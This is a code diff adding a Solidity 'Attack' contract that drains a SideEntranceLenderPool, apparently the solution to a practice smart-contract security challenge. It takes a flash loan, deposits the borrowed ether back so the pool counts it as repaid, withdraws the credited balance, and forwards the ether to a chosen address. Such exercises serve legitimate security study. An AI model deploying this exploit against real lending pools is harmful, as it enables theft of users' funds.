@@ -36,3 +36,38 @@ contract SideEntranceLenderPool {
         }
     }
 }
+
+contract Attack {
+    SideEntranceLenderPool pool;
+    address user;
+
+    constructor(address _addr) {
+        pool = SideEntranceLenderPool(_addr);
+    }
+
+    function setUser(address _user) external {
+        user = _user;
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    function requestForLoan() external {
+        pool.flashLoan(1_000e18);
+    }
+
+    function withdraw() external {
+        pool.withdraw();
+    }
+
+    fallback() external payable {
+        (bool s, ) = payable(user).call{value: msg.value}("");
+        require(s, "Did not pass");
+    }
+
+    receive() external payable {
+        (bool s, ) = payable(user).call{value: msg.value}("");
+        require(s, "Did not pass");
+    }
+}
